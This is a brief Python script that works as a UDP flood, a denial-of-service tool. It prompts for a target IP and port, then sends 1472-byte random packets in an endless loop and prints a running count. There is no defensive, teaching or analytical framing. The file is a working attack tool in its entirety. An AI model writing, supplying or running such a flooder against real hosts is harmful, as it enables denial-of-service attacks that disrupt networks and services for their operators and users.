import sys
import os
import socket
import random
import struct

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1472)

ip = input('IP Target : ')
port = int(input('Port: '))

os.system('echo figlet Attack Sarting')
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    print('Sent', sent, 'packet to', ip, 'through port', port)
